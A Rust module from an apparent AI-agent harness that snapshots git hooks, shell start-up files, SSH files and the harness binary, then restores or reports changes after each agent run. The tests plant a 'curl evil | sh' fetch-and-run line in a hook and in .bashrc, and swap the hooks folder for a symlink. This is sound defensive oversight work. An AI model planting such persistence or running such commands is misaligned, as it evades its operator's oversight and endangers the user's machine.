//! A tripwire for what `git status` cannot see: git's own hooks and
//! settings files, and a few files outside the project that would let an
//! agent's code run later with Lisa's rights (shell start-up files, the
//! global git settings, SSH keys, the `harness` program itself).
//!
//! The harness takes a [`Snapshot`] before a role and compares it after.
//! This only *notices* a change; preventing it would need a sandbox of the
//! operating system, which not every agent has.

use std::collections::BTreeMap;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use crate::git::{GitError, Repo};

/// Files inside the home folder that are watched, with `/`. A file that
/// does not exist is watched too: creating it is a change. Both the Unix
/// shells and Windows PowerShell are listed; on each system the others are
/// simply missing.
pub const HOME_FILES: &[&str] = &[
    // Shell start-up files: run in every new terminal.
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".zshrc",
    ".zshenv",
    ".zprofile",
    ".config/fish/config.fish",
    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
    "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
    // Global git settings: can make git run any command, also in the harness.
    ".gitconfig",
    ".config/git/config",
    // Who may log in over SSH, and what SSH runs.
    ".ssh/authorized_keys",
    ".ssh/config",
    ".ssh/rc",
];

/// The folders of git's own files that `git status` does not show and that
/// agents never need to change: hooks run commands, `info/` holds
/// attributes and excludes. (`config` is checked separately.)
const GIT_FOLDERS: &[&str] = &["hooks", "info"];

/// Files in those folders that git writes by itself: `info/refs` is the list
/// of branches that `git update-server-info` keeps for serving over plain
/// HTTP. Newer git (2.5x) runs a repack in the background after a commit,
/// and the repack rewrites this file, maybe while the next role runs. It
/// holds no command, so a change to it is not a reason to stop.
const GIT_OWN_FILES: &[&str] = &["info/refs"];

/// A file bigger than this is remembered by its size and the time it was
/// last changed instead of its whole content: the `harness` program is tens
/// of MB, and reading it twice per role would be slow. (A program that also
/// forges the time could hide a change of such a file.) It can be reported,
/// but not put back.
const MAX_KEPT_BYTES: u64 = 1024 * 1024;

/// What the tripwire watches: folders that are put back after a change, and
/// single files that are only reported.
#[derive(Debug, Clone, Default)]
pub struct Watched {
    /// Folders whose files are kept whole and put back (git's hooks, `info/`).
    pub restored_folders: Vec<PathBuf>,
    /// Single files that are only reported (see [`HOME_FILES`]).
    pub reported_files: Vec<PathBuf>,
    /// Files inside the restored folders that are not watched (see [`GIT_OWN_FILES`]).
    pub ignored_files: Vec<PathBuf>,
}

impl Watched {
    /// The usual list for `repo`: its git folders, the [`HOME_FILES`] in the
    /// home folder, and the running program itself.
    pub fn for_repo(repo: &Repo) -> Result<Self, GitError> {
        let common = repo.git_common_dir()?;
        let restored_folders = GIT_FOLDERS.iter().map(|name| common.join(name)).collect();
        let mut reported_files: Vec<PathBuf> = harness_platform::home::home_dir()
            .map(|home| HOME_FILES.iter().map(|file| home.join(file)).collect())
            .unwrap_or_default();
        if let Ok(program) = std::env::current_exe() {
            reported_files.push(program);
        }
        let ignored_files = GIT_OWN_FILES.iter().map(|name| common.join(name)).collect();
        Ok(Self {
            restored_folders,
            reported_files,
            ignored_files,
        })
    }

    /// Reads everything watched now.
    pub fn snapshot(&self) -> io::Result<Snapshot> {
        let mut files = BTreeMap::new();
        for folder in &self.restored_folders {
            add_tree(folder, &mut files)?;
        }
        for file in &self.ignored_files {
            files.remove(file);
        }
        for file in &self.reported_files {
            // A file Lisa keeps private from the harness must not stop every role.
            let content = read(file).unwrap_or_else(|e| Some(Content::Unreadable(e.kind())));
            files.insert(file.clone(), content);
        }
        Ok(Snapshot { files })
    }

    /// Is `path` inside one of the folders that are put back?
    fn is_restored(&self, path: &Path) -> bool {
        self.restored_folders.iter().any(|f| path.starts_with(f))
    }
}

/// The watched files at one moment.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Snapshot {
    /// Every watched file and what it held; `None` means it did not exist.
    files: BTreeMap<PathBuf, Option<Content>>,
}

/// What a file held.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Content {
    /// The whole content of a small file.
    Bytes(Vec<u8>),
    /// A big file's size and the time it was last changed.
    Summary {
        len: u64,
        modified: Option<SystemTime>,
    },
    /// A file that exists but cannot be read (for example no permission);
    /// this kind of error is kept, so a change of it is noticed too.
    Unreadable(io::ErrorKind),
}

/// What changed between two snapshots, split by what the harness did.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Changes {
    /// Changed files in the restored folders; they are now as before.
    pub put_back: Vec<PathBuf>,
    /// Changed single files, left as they are for Lisa to check.
    pub reported: Vec<PathBuf>,
}

impl Changes {
    /// True when nothing watched changed.
    pub fn is_empty(&self) -> bool {
        self.put_back.is_empty() && self.reported.is_empty()
    }
}

impl Snapshot {
    /// Compares `self` (taken before the role) with the files now, and puts
    /// the restored folders back as they were in `self`.
    pub fn check_and_restore(&self, watched: &Watched) -> io::Result<Changes> {
        let now = watched.snapshot()?;
        let mut changes = Changes::default();
        // A file is in one map or both; `chain` + dedup visits each once.
        let mut paths: Vec<&PathBuf> = self.files.keys().chain(now.files.keys()).collect();
        paths.sort();
        paths.dedup();
        for path in paths {
            let before = self.files.get(path).cloned().flatten();
            let after = now.files.get(path).cloned().flatten();
            if before == after {
                continue;
            }
            if watched.is_restored(path) {
                put_back(path, before.as_ref())?;
                changes.put_back.push(path.clone());
            } else {
                changes.reported.push(path.clone());
            }
        }
        Ok(changes)
    }
}

/// Adds `path` to `files`: a folder with every file in it (at any depth),
/// anything else (a file, a link) as one entry.
fn add_tree(path: &Path, files: &mut BTreeMap<PathBuf, Option<Content>>) -> io::Result<()> {
    // `symlink_metadata` does not follow a link: a link, even one in place of
    // the whole folder, is one entry, and the files it points to are not read.
    match fs::symlink_metadata(path) {
        Ok(meta) if meta.is_dir() => {
            for entry in fs::read_dir(path)? {
                add_tree(&entry?.path(), files)?;
            }
            Ok(())
        }
        Ok(_) => {
            files.insert(path.to_path_buf(), read(path)?);
            Ok(())
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e),
    }
}

/// What `path` holds now, or `None` if it does not exist.
fn read(path: &Path) -> io::Result<Option<Content>> {
    let meta = match fs::symlink_metadata(path) {
        Ok(meta) => meta,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e),
    };
    if meta.is_symlink() {
        let target = fs::read_link(path)?;
        return Ok(Some(Content::Bytes(
            format!("link to {}", target.display()).into_bytes(),
        )));
    }
    if meta.len() > MAX_KEPT_BYTES {
        return Ok(Some(Content::Summary {
            len: meta.len(),
            modified: meta.modified().ok(),
        }));
    }
    Ok(Some(Content::Bytes(fs::read(path)?)))
}

/// Writes `before` back to `path`, or removes `path` if it did not exist.
fn put_back(path: &Path, before: Option<&Content>) -> io::Result<()> {
    // A link or file the agent put there is removed first, so writing never
    // follows a link to somewhere else.
    match fs::symlink_metadata(path) {
        Ok(meta) if meta.is_dir() => fs::remove_dir_all(path)?,
        Ok(_) => fs::remove_file(path)?,
        Err(e) if e.kind() == io::ErrorKind::NotFound => {}
        Err(e) => return Err(e),
    }
    match before {
        Some(Content::Bytes(bytes)) => {
            // The agent may have removed the folder the file was in.
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(path, bytes)
        }
        // Files in the restored folders are kept whole when they can be read;
        // a missing file stays missing.
        Some(Content::Summary { .. } | Content::Unreadable(_)) | None => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn watched(dir: &Path) -> Watched {
        Watched {
            restored_folders: vec![dir.join("hooks"), dir.join("info")],
            reported_files: vec![dir.join("home/.bashrc"), dir.join("home/.gitconfig")],
            ignored_files: vec![dir.join("info/refs")],
        }
    }

    #[test]
    fn nothing_changed_means_no_changes() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        fs::write(dir.path().join("hooks/pre-commit.sample"), "sample").unwrap();
        let watched = watched(dir.path());

        let before = watched.snapshot().unwrap();

        assert_eq!(
            before.check_and_restore(&watched).unwrap(),
            Changes::default()
        );
    }

    #[test]
    fn info_refs_that_git_rewrites_by_itself_is_not_a_change() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        fs::write(dir.path().join("info/exclude"), "# excludes").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot().unwrap();

        // What a background `git repack` does after a commit.
        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();

        assert_eq!(
            before.check_and_restore(&watched).unwrap(),
            Changes::default()
        );
        assert!(dir.path().join("info/refs").exists(), "it is left alone");
    }

    #[test]
    fn hooks_are_put_back_and_home_files_reported() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(hooks.join("sub")).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "sample").unwrap();
        fs::write(hooks.join("sub/old"), "old").unwrap();
        fs::create_dir_all(dir.path().join("home")).unwrap();
        fs::write(dir.path().join("home/.bashrc"), "alias ll='ls -l'\n").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot().unwrap();

        // What an agent with a shell could do.
        fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();
        fs::write(hooks.join("pre-commit.sample"), "changed").unwrap();
        fs::remove_file(hooks.join("sub/old")).unwrap();
        fs::write(dir.path().join("home/.bashrc"), "curl evil | sh\n").unwrap();
        fs::write(dir.path().join("home/.gitconfig"), "[core]\n").unwrap();
        let changes = before.check_and_restore(&watched).unwrap();

        assert_eq!(
            changes.put_back,
            [
                hooks.join("pre-commit"),
                hooks.join("pre-commit.sample"),
                hooks.join("sub/old")
            ]
        );
        assert!(!hooks.join("pre-commit").exists());
        assert_eq!(
            fs::read_to_string(hooks.join("pre-commit.sample")).unwrap(),
            "sample"
        );
        assert_eq!(fs::read_to_string(hooks.join("sub/old")).unwrap(), "old");
        assert_eq!(
            changes.reported,
            [
                dir.path().join("home/.bashrc"),
                dir.path().join("home/.gitconfig")
            ]
        );
        // Reported files are left for Lisa.
        assert!(dir.path().join("home/.gitconfig").exists());
        // Everything is back in the folders, so a second check is quiet
        // there; the home files still differ from the first snapshot.
        let again = before.check_and_restore(&watched).unwrap();
        assert_eq!(again.put_back, Vec::<PathBuf>::new());
    }

    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
    #[cfg(unix)]
    #[test]
    fn a_link_in_place_of_the_hooks_folder_is_removed_and_its_target_kept() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "sample").unwrap();
        let elsewhere = dir.path().join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        fs::write(elsewhere.join("pre-commit"), "curl evil | sh").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot().unwrap();

        fs::remove_dir_all(&hooks).unwrap();
        std::os::unix::fs::symlink(&elsewhere, &hooks).unwrap();
        let changes = before.check_and_restore(&watched).unwrap();

        assert_eq!(
            changes.put_back,
            [hooks.clone(), hooks.join("pre-commit.sample")]
        );
        assert!(!fs::symlink_metadata(&hooks).unwrap().is_symlink());
        assert_eq!(
            fs::read_to_string(hooks.join("pre-commit.sample")).unwrap(),
            "sample"
        );
        assert!(elsewhere.join("pre-commit").exists());
    }

    #[test]
    fn a_big_file_is_compared_by_its_size_and_time() {
        let dir = tempfile::tempdir().unwrap();
        let program = dir.path().join("harness");
        let size = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
        fs::write(&program, vec![b'a'; size]).unwrap();
        let watched = Watched {
            restored_folders: Vec::new(),
            reported_files: vec![program.clone()],
            ignored_files: Vec::new(),
        };
        let before = watched.snapshot().unwrap();

        fs::write(&program, vec![b'b'; size + 1]).unwrap();

        assert_eq!(
            before.check_and_restore(&watched).unwrap().reported,
            [program]
        );
    }

    #[test]
    fn the_usual_list_watches_the_git_folders_and_the_home_files() {
        let dir = tempfile::tempdir().unwrap();
        let repo = Repo::init(dir.path()).unwrap();

        let watched = Watched::for_repo(&repo).unwrap();

        let git = dir.path().join(".git").canonicalize().unwrap();
        let folders: Vec<PathBuf> = watched
            .restored_folders
            .iter()
            .map(|f| {
                f.parent()
                    .unwrap()
                    .canonicalize()
                    .unwrap()
                    .join(f.file_name().unwrap())
            })
            .collect();
        assert_eq!(folders, [git.join("hooks"), git.join("info")]);
        assert!(watched
            .reported_files
            .iter()
            .any(|f| f.ends_with(".bashrc")));
        assert!(watched
            .reported_files
            .iter()
            .any(|f| f.ends_with(".gitconfig")));
    }
}
